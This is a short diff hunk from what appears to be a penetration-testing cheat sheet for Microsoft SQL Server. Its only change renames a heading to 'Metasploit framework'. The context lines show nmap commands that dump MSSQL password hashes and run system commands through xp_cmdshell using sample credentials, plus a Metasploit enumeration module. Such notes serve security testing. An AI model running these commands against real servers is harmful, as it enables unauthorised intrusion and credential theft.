@@ -24,7 +24,7 @@ nmap --script=ms-sql-dump-hashes --script-args=mssql.username=admin,mssql.passwo
 nmap --script=ms-sql-xp-cmdshell --script-args=mssql.username=admin,mssql.password=anamaria,ms-xp-cmdshell.cmd="ipconfig" -p 1433 <target>
 ```
 
-# Metasploit
+# Metasploit framework
 
 ```
 msf6 > use auxiliary/admin/mssql/mssql_enum
